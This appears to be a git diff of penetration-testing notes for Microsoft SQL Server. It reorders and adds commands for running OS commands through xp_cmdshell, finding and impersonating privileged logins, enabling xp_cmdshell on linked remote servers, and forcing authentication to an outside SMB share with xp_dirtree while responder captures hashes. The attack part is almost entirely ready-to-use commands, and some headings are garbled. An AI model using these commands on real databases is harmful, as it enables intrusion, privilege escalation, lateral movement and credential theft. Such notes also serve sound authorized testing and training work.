@@ -47,6 +47,20 @@ Show Tables:
 2> GO
 ```
 
+View table:
+
+```bash
+1> SELECT * FROM <table_name>
+2> go
+```
+
+Command Execution:
+
+```bash
+1> xp_cmdshell 'whoami'
+2> GO
+```
+
 XP_CMDSHELL
 
 Enable:
@@ -65,20 +79,6 @@ Enable:
 
 -- To update the currently configured value for this feature.  
 1> RECONFIGURE
-2> GO
-```
-
-View table:
-
-```bash
-1> SELECT * FROM <table_name>
-2> go
-```
-
-Command Execution:
-
-```bash
-1> xp_cmdshell 'whoami'
 2> GO
 ```
 
@@ -125,3 +125,56 @@ EXEC master..xp_dirtree '\\10.10.15.65\share\'
 
 responder -I <interface>
 ```
+
+Identify users we can impersonate
+
+```bash
+1> SELECT distinct b.name
+2> FROM sys.server_permissions a
+3> INNER JOIN sys.server_principals b
+4> ON a.grantor_principal_id = b.principal_id
+5> WHERE a.permission_name = 'IMPERSONATE'
+6> GO
+```
+
+Impersonate a user
+
+```bash
+1> EXECUTE AS LOGIN = '<USER>'
+2> SELECT SYSTEM_USER
+3> SELECT IS_SRVROLEMEMBER('sysadmin')
+4> GO
+```
+
+Linked Databases
+
+View linked databases:
+
+```bash
+1> SELECT srvname, isremote FROM sysservers
+2> GO
+```
+
+or
+
+```bash
+EXEC sp_linkedservers;
+```
+
+Verify who we are on the remote server remote server:
+
+```bash
+EXEC ('select SYSTEM_USER;') AT [<remote_server>];
+```
+
+Gain code execution on remote server  emote server:
+
+```bash
+EXEC ('EXEC sp_configure ''show advanced options'',1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT [<remote_server>];
+
+EXEC ('EXEC xp_cmdshell ''whoami'';') AT [<remote_server>];
+```
+
+
+
+
